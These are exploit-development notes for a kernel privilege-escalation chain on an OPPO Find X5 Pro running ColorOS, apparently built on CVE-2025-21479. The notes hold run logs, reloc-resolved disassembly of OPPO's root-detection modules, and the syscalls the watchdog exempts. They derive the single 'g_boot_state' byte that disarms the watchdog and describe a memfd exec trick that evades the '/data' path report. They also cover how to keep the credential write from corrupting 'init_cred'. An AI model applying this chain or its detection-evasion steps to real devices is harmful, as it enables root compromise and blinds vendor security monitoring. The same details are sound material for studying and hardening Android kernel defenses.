# notes.md — evidence for reproducing the kill scene

Device: OPPO Find X5 Pro (PFEM10), SM8450, ColorOS 16.0.3.520 (CN01),
kernel `5.10.236-android12-9-o-gaf2075ad2c06`, bootloader locked / **green**.

Everything here is either (a) a verbatim capture from the device, or (b) offline
analysis of `oplus_security_guard.ko` / `oplus_secure_harden.ko` with the
relocations resolved. Where a fact is a measurement it says so; where it is an
inference it says so. **Nothing here is a guess presented as a result.**

---

## 0. Status of the nine requested items

| # | Requested | Status |
|---|---|---|
| 1 | One complete kill scene (dmesg + kevent + userspace) | ⚠ **userspace only** — `evidence/kill.log`. Kernel side NOT captured. |
| 2 | Timeline of the same run, LT wait method | ✅ `kill.log` + §2 below |
| 3 | Module runtime addresses, `kptr_restrict`, `perf_event_paranoid` | ⚠ **partial** — see §3: bases are masked in the baseline capture but real in the 09-15 capture |
| 4 | Reloc-resolved disassembly | ✅ `artifacts/guard_post_handler.s`, `artifacts/guard_relocs.txt`, `artifacts/guard_disasm.txt` |
| 5 | `g_boot_state` location | ✅ **solved**, §5 — including the `strstr` key |
| 6 | Kernel state after the kill | ⚠ **partial** — §7. Module stayed loaded; framework services gone |
| 7 | Build fingerprint | ✅ §8 (config values are from the kernel image, not `/proc/config.gz` — see caveat) |
| 8 | Four controlled experiments | ❌ **not run** |
| 9 | CFI scene | ❌ **not attempted** |

**The single most important result in this file is negative**: in the
best-documented full run (RUN 3, 2026-09-14) the KernelSU manager process was
polled every 10 s for 120 s and **survived**, with `kernelsu` still `Live` in
`/proc/modules` the whole time. See §2.3 and §9.

**The second is measured, not inferred**: the write primitive has an unavoidable
side effect, `*(write_value + 0x08) = write_target`, and the `W7` pass aims
`write_value` at the global `init_cred`. The corruption is visible in a
readback — `init_cred.suid` becomes `0xffffff88` = `4294967176`, exactly the
third field of the `Uid:` line — and zeroing `init_cred + 8` repairs it. See §11.

---

## 1. What the kill scene does and does not contain

`evidence/kill.log` holds four runs verbatim. All of them show the same shape:

```
LT OK task=0x... child_pid=N
WV@0x778 LANDED (ps Uid=root)          <- real_cred points at the init_cred alias
WV@0x780 HIT                           <- cred follows
iter=0 uid=0 caps=1 capeff=0x0 pid=N
★ uid=0 confirmed — child execs .sysdb
★ kernelsu LOADED (t+5s):
kernelsu 217088 2 - Live 0x0000000000000000 (O)
```

What is **missing** and why:

* **No `[ROOTCHECK-*]` printk text.** `oplus_root_killed` does
  `printk` + `do_exit(SIGKILL)`, so if it had fired the line would be in the
  kernel ring buffer. We never read the buffer back for these runs (§6).
* **No kevent payload.** `oplus_root_check_succ` formats
  `$$sys_call_number@@%d$$set_id_flag@@%d$$addr_limit@@%lx$$enforce@@%d…` and
  hands it to **`kevent_send_to_user`** — a userspace daemon, not the console.
  There is no path from that daemon to a shell-readable file.
* **No proof of *why* anything stopped.** RUN 3 says nothing stopped.

So the honest summary of item 1 is: we have the userspace half, and the kernel
half needs one more run with the capture from §6 armed. The exact strings to
grep for are in §4.3 — they are known, they just were not collected.

---

## 2. Timeline

### 2.1 RUN 1 — 2026-09-14, `out/fire_ksud_0914_073742.log`

| t | event |
|---|---|
| 07:37:42 | start, `getenforce=Permissive` (already), `uptime_base=1079.21` |
| 07:37:44 | `LT OK task=0xffffff89325a5c80 child_pid=17984` |
| 07:38:02–07:38:52 | `WV@0x778` rounds 1–2 miss |
| **07:39:42** | **`WV@0x778 LANDED (ps Uid=root)` round 3** — `real_cred` now points at the `init_cred` alias |
| **07:40:26** | **`WV@0x780 HIT` round 1** — `cred` follows, `getuid()` returns 0 |
| 07:40:26+ | parent pokes child → child `exec`s `/data/local/tmp/.sysdb` (ksud late-load) |
| +5 s | `kernelsu 217088 2 - Live 0x0000000000000000 (O)` |
| 07:41:27 | run ends: `KO LOADED, crowning deferred` |

### 2.2 RUN 2 — 07:55:18 → 08:01:39

Same shape; `WV@0x778` landed on round 1, `WV@0x780` took until round 6.
`uid=0 caps=1 capeff=0x0 pid=12523`. Identical result.

### 2.3 RUN 3 — `out/autopilot_0914_074817.log` (the informative one)

W1 took 6 rounds to reach Permissive. Then RUN 2's chain, then a **crowning
test**: launch the KernelSU manager and poll it.

```
=== crowning test: am start manager ===
mgr_pid=11800
Uid:	10333	10333	10333	10333
t+10s  up=805.89  mgr=[11800] ksu=1
...
t+120s up=921.70  mgr=[11800] ksu=1
★ manager SURVIVED 120s — crowning likely safe (check UI)
```

**`mgr` stayed `[11800]` for all 12 polls and `ksu=1` throughout.** No reboot, no
panic, no disappearance. This run contradicts "the root process gets killed"
and it is the strongest single piece of evidence in the corpus.

### 2.4 RUN 4 — 2026-09-15, `out/dev_t5_*.txt`, `out/t5_*.txt`

Same chain, but ksud is now fed through **memfd**:

```
LT child exec /system/bin/id...
LTC pre-exec enforce=0 (skip pass if 0)
LTC exec phase (unlocked=1)
LT child exec /data/local/tmp/glx12 (4 args)
LT child memfd loaded 5014624 bytes (fd=5)
kernelsu 217088 0 - Live 0xffffffe21e6f2000 (O)
```

Then, 20/40/60 s later (`out/t5_keepalive.txt`):

```
t+ 20 s up=5831 ko=1 enf=1 kptr=0
t+ 40 s up=5851 ko=1 enf=1 kptr=0
t+ 60 s up=5871 ko=1 enf=1 kptr=0
--- ksu procs / manager ---
cmd: Can't find service: package
```

and (`out/wake_check.txt`):

```
kernelsu 217088 0 - Live 0xffffffe21e6f2000 (O)
cmd: Can't find service: power
cmd: Can't find service: input
cmd: Can't find service: phone
cmd: Can't find service: wifi
```

**The module is still `Live`; the Android framework is gone.** `uptime` kept
increasing (`5831 → 5871 → 5886`), so there was no kernel panic and no reboot
during the run — but `system_server`'s services were unreachable, and the device
had to be manually rebooted afterwards (`out/_post_reboot_check.txt`).

> ⚠ This is an observation, not a diagnosis. Three readings are consistent with
> it and we cannot separate them yet:
> (a) the OPPO userspace daemon (the `kevent_send_to_user` receiver) killed the
>     framework in response to a report from path 1 or path 2,
> (b) the credential write damaged system-wide state — see §11, where the
>     `init_cred+8` side effect is measured, or
> (c) the fake cred's own `group_info` is garbage (§10.6).
> Experiment 9.0 + 8.4 in §9 would separate (b)/(c) from (a).

### 2.5 What the LT child was doing while its credentials changed

**`pause()`.** Not a userspace spin. From `src/core/exploit.c`:

```c
1731:  if (drain[i] == 0) { pause(); _exit(0); }
1887:  for (;;) pause();
```

and the logs show the wake mechanism explicitly:
`LT parent pid=18996 child=21005 (poke: kill -USR1 18996)` / `[*] [LT] child woken`.

On arm64 there is no `pause` syscall; bionic implements `pause()` as
`rt_sigsuspend` (**133**). 133 is **not** in the exempt set (§4.2). So at the
instant the child is woken and its `sys_exit` runs, the watchdog sees
`cached_uid(2000) > cred->uid(0)` and `syscallno = 133 ∉ exempt` → report + kill.
This is the mechanism predicted in the review and it is directly testable with
experiment 8.1 in §9.

---

## 3. Module runtime addresses

Three captures exist, from different states, and they disagree — which is the
finding.

**(a) Baseline, plain shell, SELinux Enforcing** — `out/_kallsyms_probe.txt`:

```
--- modules head ---
explorer 294912 1 - Live 0x0000000000000000 (O)
--- guard module? ---
oplus_security_guard       24576 0 - Live 0x0000000000000000 (O)
oplus_secure_harden        16384 1 oplus_security_guard, Live 0x0000000000000000 (O)
oplus_security_keventupload 20480 2 oplus_security_guard,oplus_secure_harden, Live 0x0000000000000000 (O)
oplusboot                  20480 7 oplus_security_guard,oplus_secure_harden,qcom_q6v5_pas,..., Live 0x0000000000000000 (O)
--- kptr_restrict ---
cat: /proc/sys/kernel/kptr_restrict: Permission denied
--- perf_event_paranoid ---
-1
--- kallsyms head as shell ---
head: /proc/kallsyms: Permission denied
```

**(b) After W1 (Permissive)** — `out/probe_after_w1_b.txt`:

```
--- dmesg readable? ---
21718                        <- dmesg IS readable in this state
--- kallsyms verified_bootstate full ---
0000000000000000 r __kstrtab_verified_bootstate   [oplusboot]
0000000000000000 B verified_bootstate            [oplusboot]
```

`/proc/kallsyms` now opens and yields **names with every address zeroed**. Note
the symbol that matters: `verified_bootstate` is an **`oplusboot`** symbol (§5).

**(c) During RUN 4** — `out/t5_poke.txt`, `out/t5_keepalive.txt`,
`out/wake_check.txt`:

```
kernelsu 217088 0 - Live 0xffffffe21e6f2000 (O)
enf=1 up=5786
...
t+ 20 s up=5831 ko=1 enf=1 kptr=0
```

**A real load base is present here**, and `kptr=0` was read successfully.

Conclusions, stated precisely:

* `/proc/modules` gives **name, size, refcount, dependency list and state**
  reliably. It gives the load base only when `kptr_restrict` permits it — it was
  `0x0` in capture (a) and a real `0xffffffe2…` address in capture (c).
* `/proc/kallsyms` is **SELinux-gated**, not just `kptr`-gated: denied outright
  in (a), readable-but-zeroed in (b).
* **`kptr_restrict` changed between (a) and (c)** — it was `0` in (c). We did
  not write it (our 8-byte primitive can only store `0` or a kernel pointer, and
  it cannot be aimed at a sysctl's middle bytes). Loading `kernelsu.ko` is the
  obvious suspect, but **that is an inference and is not proven**.
* **No `oplus_security_guard` / `oplus_secure_harden` load base has been captured
  with the address un-masked.** That is the one number item 3 is still missing.

> Note the sizes differ between `/proc/modules` (24576 / 16384 / 20480) and the
> `.ko` files on disk (31872 / 31032 / 16080) — `/proc/modules` reports the
> loaded *core* size, not the file size. Do not compare them directly.

What we can give as a pair right now is **file offset only** (fully resolved in
`artifacts/guard_post_handler.s`); the base must come from a leak. Both the
module region and the kernel base are obtainable: `perf_event_paranoid = -1`
(measured, capture (a)) allows unprivileged IP sampling, and a same-kernel
precedent leaks the kernel base through a `pselect` side channel.

---

## 4. The kill chain, with relocations resolved

### 4.1 Control flow (`oplus_root_check_post_handler`, `.text+0x3e8`)

```
0x3fc  ldr  x0, [x8, #0xe00]        ; cached uid, written by the sys_enter hook
0x400  cbz  x0, #0x48c              ; cached uid == 0 -> return
0x404  adrp/ldrb  .data..ro_after_init   ; g_boot_state
0x40c  tbnz w9, #0, #0x48c          ; bit0 set -> return
0x410  ldr  x9, [x8, #0x780]        ; cred
0x414  ldr  w3, [x8, #0xdf8]        ; cached syscallno
0x418..0x450   cmp / b.hi #0x468    ; uid, euid, gid, egid: cached > current -> dispatch
0x454  ldr  x9, [x8, #8]            ; addr_limit
0x460  cmp  x9, #0x8000000001
0x464  b.lo #0x48c                  ; only reached when NO id descended
0x468  sub  w9, w3, #0x8f           ; w9 = syscallno - 143
0x46c  cmp  w9, #0x47               ; 143..214
0x470  b.hi #0x4a0                  ; outside the table -> kill
0x474  adrp/add  .rodata+0          ; 72-entry int32 table
0x47c  adr  x11, #0x47c
0x480  ldrsw x12, [x10, x9, lsl #2]
0x484  add  x11, x11, x12
0x488  br   x11
0x48c  ret                          ; release
0x4a0  bl oplus_root_check_succ     ; -> kevent_send_to_user
0x4ac  bl oplus_root_killed         ; -> printk + do_exit(SIGKILL)
```

> **The four descending-edge comparisons branch straight to `0x468`.** They do
> **not** fall through the `addr_limit` gate at `0x454`. The dispatch is entered
> when *either* some id descended *or* `addr_limit == KERNEL_DS`. An earlier
> internal write-up of ours claimed the `addr_limit` gate made the whole kill
> path unreachable for user processes; **that was wrong** and is retracted here.
> The counter-evidence is in §4.4.

Consequences that matter for exploit ordering:

* The hook fires on the syscall **during which** the credentials changed — the
  one whose `sys_enter` still cached the old uid. `__NR_futex` is 98, which is
  `< 143`, so a credential write performed inside one's own `futex` call is
  killed. That is exactly what RUN 1–4 do.
* If the task is already `uid=0` when a syscall *enters*, `0x400` returns and the
  hook stays blind from then on.

### 4.2 Exempt set — `.rodata+0`, indices 143–214

12 of the 72 slots return to `0x48c` instead of `0x4a0`:

```
143 setregid   144 setgid      145 setreuid   146 setuid
147 setresuid  149 setresgid   203 connect    204 getsockname
208 setsockopt 210 shutdown    213 readahead  214 brk
```

> **Correction (2026-09-18).** An earlier revision of
> `artifacts/guard_exempt_table.txt` and of the README labelled every entry
> **one lower** than the real arm64 number — it called 146 `setresuid` (it is
> `setuid`), 210 `sendmsg` (it is `shutdown`) and 214 `munmap` (it is `brk`).
> The *numbers* were always right; the *names* were wrong. This is not cosmetic:
> `sendmsg` (211), `munmap` (215), `getsockopt` (209) and `getpeername` (205)
> are **not** exempt, so a thread that blocks in one of those while its
> credentials change is **killed, not released**. Regenerate with
> `tools/gen_exempt_table.py`; the names were cross-checked entry by entry
> against `sys_call_table` at `0xffffffc00a13d8c0` in this device's kernel image.

### 4.3 Strings to grep for in the next capture

Recovered from the module, so a future run knows exactly what to look for:

```
[ROOTCHECK-CAP-ERROR]:CAP security incident detected, old->uid.val is %u, new->uid.val is %u, ...
[ROOTCHECK-CAP-ERROR]:CAP security incident detected, old->gid.val is %u, ...
[ROOTCHECK-RC-ERROR]:Kill the process of escalation...
[ROOTCHECK-RC-INFO]:oplus_root_check_succ,payload:%s
[ROOTCHECK-RC-INFO]:verified_bootstate is %s .
$$old_uid@@%d$$old_euid@@%d$$old_egid@@%d$$sys_call_number@@%d$$addr_limit@@%lx$$curr_uid@@%d$$curr_euid@@%d$$curr_egid@@%d$$curr_name@@%s$$ppid@@%d$$ppidname@@%s$$enforce@@%d
```

`$$sys_call_number@@` is the field worth the run: it is the syscall number that
was in flight when the credentials changed.

### 4.4 Why the retraction in §4.1 is safe

The `5.10.252-dirty` build of `oplus_security_guard.ko` shipped with the
CVE-2025-21479 package has **byte-identical `.text` and `.rodata`** to this
device's copy (`cmp -l` shows the first differing byte at file offset 0x3110,
i.e. past the end of `.rodata`). Its log
(`…/logs/oneclick_0905_180740_a1.log:327-330`) records the four `adrp+ldrb` sites
at `text+0x404 / 0x784 / 0x9d4 / 0xf18` converging on one VA — the same four
sites, with the same relocations, in the module analysed here. And that chain is
known to have run **and to have required patching the gating byte to get past**.
So the kill path does fire in practice.

---

## 5. `g_boot_state` — full derivation

`g_boot_state` is a **1-byte LOCAL object in `.data..ro_after_init`** (section
index 16, file offset 0x3150). Because it is a section-local symbol with no name
in `.strtab`, its relocations point at the **section** symbol
`.data..ro_after_init + 0`. That is why a name-based relocation lookup returns
nothing, and why this looked unresolvable. It is resolvable:

```
### oplus_boot_state_init  @ .text+0x4c8
0x4dc  adrp  x19, #0  ; ADR_PREL_PG_HI21  -> verified_bootstate     (UND, from oplusboot)
0x4e0  adrp  x0,  #0  ; -> .rodata+0x7f1  = "[ROOTCHECK-RC-INFO]:verified_bootstate is %s .\n"
0x4e4  add   x19, x19, #0
0x4f0  bl    printk
0x4f4  adrp  x1,  #0  ; -> .rodata+0x9af  = "orange"
0x0500  bl    strstr                      ; strstr(verified_bootstate, "orange")
0x0508  cmp   x0, #0
0x050c  cset  w8, ne                      ; w8 = (strstr != NULL)
0x0510  adrp  x9, #0  ; -> .data..ro_after_init
0x0514  strb  w8, [x9]                    ; g_boot_state = w8

### is_unlocked  @ .text+0x4b4
0x4b8  adrp  x8, #0  ; -> .data..ro_after_init
0x4bc  ldrb  w0, [x8]
0x4c4  ret                                ; literally LDRB + RET
```

So:

```
g_boot_state = (strstr(verified_bootstate, "orange") != NULL)
```

`verified_bootstate` is a **string in the `oplusboot` module's `.bss`**. The
bootloader on this device is **green** (locked), so the string does not contain
`orange`, `strstr` returns NULL, `w8 = 0`, and the watchdog is **armed**. That
matches every observation.

`is_unlocked()` is a single `LDRB`, and `oplus_root_check_post_handler` tests it
with `tbnz w9, #0`. **Setting bit 0 of that one byte disarms the guard.** The
same `verified_bootstate` gate is reused by `oplus_secure_harden`'s
`oplus_heapspray_check`, so the same byte covers more than one detector.

### Runtime address

```
g_boot_state  = module core base + 0x3020
```

This is a **measurement, not a derivation**. The CVE-2025-21479 reference log
records the four `adrp+ldrb` sites resolving to `core + 0x3020` on a module whose
`.text`/`.rodata` are byte-identical to ours (§4.4). Our own replication of
`layout_sections()` (`tools/mod_layout.py`) puts `.data..ro_after_init` at
`0x2988` — **0x98 off**. Our model is incomplete; the measured `0x3020` wins.

Writing the module's virtual address faults (`CONFIG_STRICT_MODULE_RWX=y`); the
physmap alias is the way in, and the exploit already uses that alias region —
the 09-14 logs write `0xffffff802a7e0be0`, which is the P0 alias
(`0xffffff8000000000`) of `init_cred` at image offset `0x027e0be0`.

> **The 8-byte primitive cannot set this byte.** It stores only `0` or a valid
> kernel address, so the low byte can never be `1`. Writing `0` leaves the
> watchdog armed. Setting `g_boot_state` genuinely requires the byte-granular
> `physrw` primitive — this is a real constraint, not a preference.

---

## 6. Channels, and the recipe to capture the kernel half

| Channel | Enforcing (plain shell) | After W1 → Permissive |
|---|---|---|
| `dmesg` / `/dev/kmsg` | ❌ `klogctl: Permission denied` | ✅ readable — **21 718 lines captured** |
| `/proc/kallsyms` | ❌ `Permission denied` | ⚠ opens, **all addresses zeroed** |
| `/proc/modules` | ⚠ readable, **base `0x0`** | ⚠ readable; base was real (`0xffffffe2…`) in the 09-15 run |
| `/proc/sys/kernel/kptr_restrict` | ❌ `Permission denied` (read *and* write) | observed as `0` once (`out/t5_keepalive.txt`) |
| `/proc/sys/kernel/dmesg_restrict` | ❌ `Permission denied` | — |
| `/proc/cmdline` | ❌ `Permission denied` | — |
| `perf_event_paranoid` | ✅ `-1` | ✅ |
| `logcat -b kernel` | ❌ **empty buffer** (`tools/phase1_capture.sh`, section `===logcat_kernel` → `===END`) | — |
| `logcat -b all` | ✅ (7.8 MB and 36 MB captures exist) — but contains no kernel messages | ✅ |
| `/sys/fs/pstore/` | listable; nothing relevant unless a crash occurred | — |

**Recipe** (this is the only thing standing between us and item 1):

```bash
# 1. start the capture BEFORE the chain, in the same shell that later goes Permissive
adb shell 'dmesg -w > /data/local/tmp/k 2>&1 &'
# 2. run the chain (W1 -> WV@0x778 -> WV@0x780 -> exec), unchanged
# 3. immediately afterwards
adb shell "grep -aE 'ROOTCHECK|oplus_root|sys_call_number|set_id_flag|addr_limit|enforce|path@@|execve_' /data/local/tmp/k"
adb pull /data/local/tmp/k
```

The extra patterns matter. Path 1 prints `[ROOTCHECK-CAP-ERROR]` /
`[ROOTCHECK-RC-ERROR]`; path 2 prints `[ROOTCHECK-EXEC-INFO]:common %s result %s`
with `execve_report` / `execve_block`; and path 2's kevent payload carries
`%d,path@@%s`. Grepping only `ROOTCHECK` would still catch path 2, but `path@@`
and `execve_` distinguish it from path 1 at a glance — and telling those two
apart is the whole point of the run.

Because `dmesg` is only readable once SELinux is Permissive, the reader must be
started as a long-running process whose permission is re-evaluated per read —
which `dmesg -w` is — or simply re-run step 3 after the run, since the ring
buffer persists (`dmesg` returned 21 718 lines of history).

One caveat worth recording: in the single dmesg capture we do have
(`out/dev_t5_dmesg.txt`, uptime 3137 → 5872, which contains the KernelSU
initialisation at uptime 5760) there is **no `[ROOTCHECK-*]` line anywhere**,
and no `Killed process` line. If a kill happened inside that window it did not
come from `oplus_root_killed`'s `printk`. That capture may simply not cover a
kill, so treat it as "not yet observed", not as "never happens".

---

## 7. Kernel state after the run

From `out/t5_poke.txt`, `out/t5_keepalive.txt`, `out/wake_check.txt`:

| Question | Observation |
|---|---|
| Is `kernelsu` still loaded? | ✅ **yes** — `kernelsu 217088 0 - Live 0xffffffe21e6f2000 (O)` at the moment of load and still `Live` 60 s later (`ko=1` at t+20/40/60 s) |
| Is there a ksud daemon process? | ❌ `ksud daemon procs:` is empty; `pm list packages` → `Can't find service: package` |
| Are the original and child pids gone? | The exploit's own processes exit normally at the end of the run; the LT child logs `LT child reaped=-1 status=0 exited=1 sig=0` |
| Did an OPPO userspace daemon re-kill? | **Cannot be distinguished from the evidence we have.** The framework services were gone (§2.4) but we have no report text, so we cannot attribute it. |
| Reboot / panic? | `uptime` increased monotonically across the run (5831 → 5871 → 5886) — **no panic, no reboot during the run**. A manual reboot was needed afterwards. |

This is the item the advisor asked for and it is the weakest part of our
evidence: **we cannot yet separate "kernel `do_exit`" from "userspace second
kill"**, because the channel that would tell us (`$$enforce@@` and the
`[ROOTCHECK-*]` text) has never been captured.

---

## 8. Build fingerprint

```
uname -a   Linux localhost 5.10.236-android12-9-o-gaf2075ad2c06 #1 SMP PREEMPT
           Thu May 21 09:43:44 UTC 2026 aarch64 Toybox
OS         ColorOS 16.0.3.520 (CN01)          <- unchanged from the README
boot_id    df70dfcc-b3a1-4e25-822f-688fcefbc070   (one boot; not stable)
bootreason reboot,shell  (history: reboot,shell / reboot,shell / bootloader / reboot,edl)
SELinux    Enforcing at boot
perf_event_paranoid = -1
```

Kernel config values — **caveat: these come from the kernel image in this
analysis tree, not from `/proc/config.gz` on the device.** `/proc/config.gz` was
never pulled, so treat the values as "the image this analysis was done against",
not as a runtime readback:

```
CONFIG_KASAN=y
# CONFIG_KASAN_GENERIC is not set
# CONFIG_KASAN_SW_TAGS is not set
CONFIG_KASAN_HW_TAGS=y
CONFIG_ARM64_MTE=y
CONFIG_STATIC_USERMODEHELPER=y
CONFIG_STATIC_USERMODEHELPER_PATH=""
CONFIG_STRICT_MODULE_RWX=y
CONFIG_SET_FS=y
CONFIG_CFI_CLANG=y
CONFIG_ARM64_PTR_AUTH=y
CONFIG_SHADOW_CALL_STACK=y
CONFIG_RANDOMIZE_BASE=y
# CONFIG_RANDOMIZE_MODULE_REGION_FULL is not set
CONFIG_UNMAP_KERNEL_AT_EL0=y
CONFIG_ARM64_VA_BITS=39
CONFIG_USER_NS=n
CONFIG_NF_TABLES=n
CONFIG_SYSVIPC=n
```

On `CONFIG_KASAN=y`: the config is `HW_TAGS` with `GENERIC`/`SW_TAGS` off, i.e.
MTE-based, and MTE-based KASAN only tags the **heap**. It cannot see a stack UAF,
which is consistent with this CVE producing no KASAN report. Whether it is
enabled *at runtime* depends on the boot parameters; the boot image's
`vendor_boot` cmdline contains **no `kasan.*` parameter at all** and
`buildvariant=user`. Confirming it needs a kernel read of `kasan_flag_enabled`.
Not a blocker either way.

---

## 9. Experiments not yet run

Each changes exactly one variable. None has been executed. Ordered by what it
buys per unit of effort, which is not the order they were first listed in.

| # | Change | Question it answers |
|---|---|---|
| **9.0** | **stop pointing `cred`/`real_cred` at the `init_cred` alias** — put the fake cred in a sprayed page and keep `write_value` inside that page | does RUN 4's framework death go away? This is the only change that currently explains it, and the mechanism is measured (§11). **Implemented in code (2026-09-18): the alias path is refused, and the repair is local to `cred_page+8`.** Needs a device run. |
| **9.1** | **exec the LT loader through a memfd** so the `execve` target's `d_path()` is `/memfd:…` | does path 2 stop reporting? **Implemented in code: `V12_EXEC_MEMFD` now defaults on.** Needs a device run. |
| **8.4** | do not exec ksud at all; after uid=0 just report and sleep 120 s (`V12_NO_EXEC=1`) | does the damage happen at `execve` (→ the `/data*` path check) or at the credential write? |
| **8.1** | LT child: replace `pause()` with a pure userspace spin (no syscall while blocked) | does the kill still happen? If it survives, the descending-edge window is the whole story |
| **8.3** | caps-only (uid stays 2000, `cap_effective = FULL`) then `finit_module` | can the module be loaded without any uid descent? **Only meaningful once the `CapEff` readout in §10.5 is explained.** |
| 8.2 | LT child: block in an **exempt** syscall — `shutdown`/`setsockopt`/`connect`/`readahead`/`brk`, **never `sendmsg`** (§4.2) | does the exempt table really release? |

9.0, 9.1 and 8.4 can all be done in the same run: make the credential change
without touching `init_cred`, exec nothing, and watch whether the framework
survives.

9.0 and 8.4 can be done in the same run: make the credential change without
touching `init_cred`, then only `id` + sleep, and watch whether the framework
survives.

8.4 matters because the ksud binary is exec'd from `/data/local/tmp/.sysdb` /
`/data/local/tmp/glx12`, and `oplus_exe_block_ret_handler` (`+0x744`) resolves
`d_path(mm->exe_file)` on `execve` (221) and calls the exported
`oplus_RWO_root_check` (`+0x538`) whenever the path starts with `/data`,
`/data/local/tmp`, `/data/nativetest` or `/data/nativetest64`; that function
reports through `kevent_send_to_user` when any of `uid`/`gid`/`euid`/`egid` is 0.
That is a **second, independent report path that the runs above walk straight
into**, and RUN 4's memfd step (`LT child memfd loaded 5014624 bytes (fd=5)`) is
consistent with someone already working around it.

Blinding the watchdog (`g_boot_state`) is **no longer the first priority** — RUN 3
survived 120 s without it (§2.3). It becomes worth doing when the goal is the
`W1` one-byte `enforcing` write or a later `g_boot_state` write, not to rescue a
process that was never SIGKILLed.

---

## 10. Corrections and retractions

Recorded in place rather than deleted, so nobody re-derives them:

1. **Retracted**: "the `addr_limit` gate makes the kill path unreachable for
   user processes". Wrong — the descending-edge comparisons branch past the
   gate (§4.1, §4.4).
2. **Corrected**: the exempt table's syscall *names* were all one lower than the
   real arm64 numbers; `sendmsg`/`munmap`/`getsockopt`/`getpeername` are not
   exempt (§4.2).
3. **Corrected**: "`dmesg` is unavailable on this device". It is unavailable
   while SELinux is Enforcing, and readable once the run has flipped to
   Permissive — which is why the kernel half of the kill scene is obtainable
   (§6).
4. **Corrected**: "`/proc/modules` and `/proc/kallsyms` are useless because
   addresses are zeroed". True in the Enforcing baseline capture, false later:
   RUN 4 shows a real `kernelsu` load base and `kptr_restrict` read back as `0`
   (§3).
5. **Open / unexplained**: `uid=0` with **`CapEff=0x0`** in every run, while
   `finit_module` succeeded. `init_cred.cap_effective` is `CAP_FULL_SET`, so a
   cred pointing at the `init_cred` alias should not read 0. Either the alias is
   not what we think, or the `capeff` field is being read from the wrong place.
   This is unresolved and it matters — **do not assume `CAP_SYS_MODULE` was
   held.** Cross-check `capget()` against `/proc/<pid>/status` before building
   anything on top of a capability assumption.
6. **Open / unexplained**: the fake cred yields
   `groups=3078438656(root)` — `0xB77D3780`, which is the low half of the target
   task's own pointer.
   **This is NOT the `init_cred+8` side effect.** In that run `gid` and `egid`
   read back clean (`uid=0(root) gid=0(root) egid=0(root) groups=3078438656`),
   so `init_cred+8` was intact; the garbage is in `group_info` only. The
   `init_cred+8` side effect shows up as a garbage **saved-uid**, which is a
   different field and a different run (§11). Treat these as two separate
   defects — both are fixed by "use a properly filled sprayed page", but for two
   different reasons.

---

## 11. The write primitive, and its side effect (measured)

Not one store but two. From the header comment of `src/core/exploit.c`, and
consistent with `fdset_map.h`:

```
*(write_target)        = write_value      // rb_erase_cached Case 1-left
*(write_value + 0x08)  = write_target     // side effect, unavoidable
```

`write_value` must be 8-byte aligned with bit 0 clear. Two consequences:

* **`g_boot_state` cannot be set with this primitive.** The byte must become
  `1`, its low bit is forced to `0`, and `write_value` is the same quantity as
  the address the side effect lands at.
* **`write_value` is also the address the side effect writes to, at `+8`.**
  Point it at a global kernel object and that object is corrupted.

### Measured instance: `init_cred`

`out/t5_w7_778.txt`:

```
shape shift=0 wps=5: in[0]=0xffffff802a7e0be0 (write_value) in[2]=0xffffff8800cdd178 (write_target)
W7[W7] write_target= 0xffffff8800cdd178
Uid:	0	0	4294967176	0
```

`write_value = 0xffffff802a7e0be0` is the `init_cred` alias and
`write_target = 0xffffff8800cdd178` is `child_task + 0x778`. The side effect
therefore stores `0xffffff8800cdd178` at `init_cred + 8`, i.e. across `gid` and
`suid`:

```
init_cred.gid  = 0x00cdd178
init_cred.suid = 0xffffff88 = 4294967176     <-- the third field of the Uid: line
```

The match is exact, so this is a measurement and not an inference. `init_cred` is
shared by every kernel thread, so this is a global corruption, not a local one.

### And the repair, also measured

`out/t5_repair.txt`:

```
--- before repair ---   Uid:	0	0	4294967176	0
repair attempt 1        probe_state = R     Uid: 0 0 4294967176 0
repair attempt 2        probe_state = D     Uid: 0 0 0 0
repair attempt 3        probe_state = D     Uid: 0 0 0 0
```

The repair pass is the one that used `in[2] = 0x0 (write_target)`, i.e. it did
not aim the primary store at all — it relied on the side effect to put `0` at
`init_cred + 8`. That is what "W7 stage 3: zero-write `init_cred+8`" always was:
a repair of damage the exploit itself had just caused.

### What to do instead

Keep `write_value` inside the sprayed page, so the side effect lands at
`write_value + 8` in the same page. The `W1` and `W3` passes already do this
(`write_value = base + 0x100` → side effect at `base + 0x108`, harmless); the
`W7`/`W2` passes are the ones that point it at `init_cred`. The cred page then
has to be filled in field by field — `uid`/`euid`/`gid`/`egid` together, plus
`user`, `user_ns` and `group_info` — which is why §10.6's `groups=` garbage is a
separate defect rather than a consequence of this one.

---

## 12. Boundary

* All device facts above are verbatim captures from the researcher's own device.
  No device write was performed for this document.
* All disassembly was produced offline from the vendor modules and the kernel
  image; `artifacts/guard_post_handler.s` is regenerable with
  `tools/gen_guard_disasm.py` once the vendor modules are pulled from a device
  (`NOTICE.md` explains why they are not redistributed).
* ✅ measured · ⚠ inference with stated basis · ❌ no conclusion.
* No claim is made that no other detector exists, and no candidate set has been
  exhausted.
